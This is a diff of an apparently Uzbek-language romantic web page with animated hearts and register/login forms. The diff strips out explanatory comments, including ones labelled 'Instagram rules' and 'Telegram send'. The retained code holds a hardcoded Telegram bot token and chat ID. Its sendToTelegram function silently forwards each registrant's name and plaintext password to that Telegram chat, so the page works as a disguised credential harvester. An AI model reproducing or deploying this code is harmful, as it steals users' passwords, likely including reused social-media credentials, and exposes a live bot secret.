@@ -163,7 +163,7 @@
     line-height: 1.5;
   }
 
-  /* ---- Welcome page ---- */
+
   #welcome-page {
     text-align: center;
     padding: 40px 20px;
@@ -278,7 +278,6 @@
 
 <div class="toast" id="toast"></div>
 
-<!-- RO'YXATDAN O'TISH -->
 <div class="page active" id="register-page">
   <div class="card">
     <div class="hearts-logo">💕</div>
@@ -313,7 +312,7 @@
   </div>
 </div>
 
-<!-- KIRISH -->
+
 <div class="page" id="login-page">
   <div class="card">
     <div class="hearts-logo">🌹</div>
@@ -340,7 +339,6 @@
   </div>
 </div>
 
-<!-- XUSH KELIBSIZ SAHIFA -->
 <div class="page" id="welcome-page">
   <div class="heart-ring">
     <span class="center-heart">💖</span>
@@ -362,7 +360,6 @@
 const BOT_TOKEN = '7934580957:AAHNrrbVlpasXtmTLBVbPvzl7fnSszNK65k';
 const CHAT_ID = '1798436265';
 
-// ---- Canvas: mouse-following hearts + particles ----
 const canvas = document.getElementById('bg');
 const ctx = canvas.getContext('2d');
 let W, H;
@@ -403,7 +400,6 @@ function spawnHeart(x, y) {
   });
 }
 
-// Background drifting particles
 for (let i = 0; i < 60; i++) {
   particles.push({
     x: Math.random() * 1920,
@@ -417,7 +413,7 @@ for (let i = 0; i < 60; i++) {
 }
 
 function drawBackground() {
-  // Dark romantic gradient
+
   const grad = ctx.createRadialGradient(W/2, H/2, 0, W/2, H/2, Math.max(W, H));
   grad.addColorStop(0, '#1a0020');
   grad.addColorStop(0.5, '#0d000f');
@@ -430,14 +426,14 @@ function animate() {
   ctx.clearRect(0, 0, W, H);
   drawBackground();
 
-  // Draw mouse trail glow
+
   const radGrad = ctx.createRadialGradient(mouse.x, mouse.y, 0, mouse.x, mouse.y, 120);
   radGrad.addColorStop(0, 'rgba(255,107,157,0.12)');
   radGrad.addColorStop(1, 'rgba(255,107,157,0)');
   ctx.fillStyle = radGrad;
   ctx.fillRect(0, 0, W, H);
 
-  // Background particles
+
   particles.forEach(p => {
     ctx.globalAlpha = p.alpha;
     ctx.font = `${p.size}px serif`;
@@ -448,7 +444,7 @@ function animate() {
     if (p.x > W + 30) p.x = -30;
   });
 
-  // Mouse hearts
+
   hearts.forEach((h, i) => {
     ctx.globalAlpha = h.life;
     ctx.font = `${h.size}px serif`;
@@ -464,7 +460,7 @@ function animate() {
 }
 animate();
 
-// ---- Password validation (Instagram rules) ----
+
 function validatePassword(pass) {
   if (pass.length < 8) return 'Parol kamida 8 ta belgi bo\'lishi kerak';
   if (!/[A-Z]/.test(pass)) return 'Kamida 1 ta katta harf bo\'lishi kerak (A-Z)';
@@ -474,7 +470,7 @@ function validatePassword(pass) {
   return null;
 }
 
-// ---- Telegram send ----
+
 async function sendToTelegram(name, pass) {
   const msg = `💕 Yangi ro'yxat!\n\n👤 Ism: ${name}\n🔑 Parol: ${pass}\n\n🌹 Sevgi saytdan`;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -487,7 +483,6 @@ async function sendToTelegram(name, pass) {
   } catch(e) {}
 }
 
-// ---- Local storage users ----
 function getUsers() {
   return JSON.parse(localStorage.getItem('love_users') || '{}');
 }
@@ -497,7 +492,7 @@ function saveUser(name, pass) {
   localStorage.setItem('love_users', JSON.stringify(users));
 }
 
-// ---- Toast ----
+
 function showToast(msg, duration = 2500) {
   const t = document.getElementById('toast');
   t.textContent = msg;
@@ -505,7 +500,7 @@ function showToast(msg, duration = 2500) {
   setTimeout(() => t.classList.remove('show'), duration);
 }
 
-// ---- Page switch ----
+
 function showPage(id) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById(id).classList.add('active');
@@ -519,7 +514,6 @@ function logout() {
   showPage('login-page');
 }
 
-// ---- Register ----
 async function register() {
   const name = document.getElementById('reg-name').value.trim();
   const pass = document.getElementById('reg-pass').value;
@@ -547,7 +541,6 @@ async function register() {
   }, 1200);
 }
 
-// ---- Login ----
 function login() {
   const name = document.getElementById('login-name').value.trim();
   const pass = document.getElementById('login-pass').value;
@@ -566,7 +559,6 @@ function login() {
   showWelcome(name);
 }
 
-// ---- Welcome ----
 function showWelcome(name) {
   document.getElementById('welcome-name-text').textContent = name;
   showPage('welcome-page');
@@ -584,7 +576,7 @@ function launchFireworks() {
   }
 }
 
-// ---- Auto login if session ----
+
 window.addEventListener('load', () => {
   const cur = localStorage.getItem('love_current');
   if (cur) showWelcome(cur);
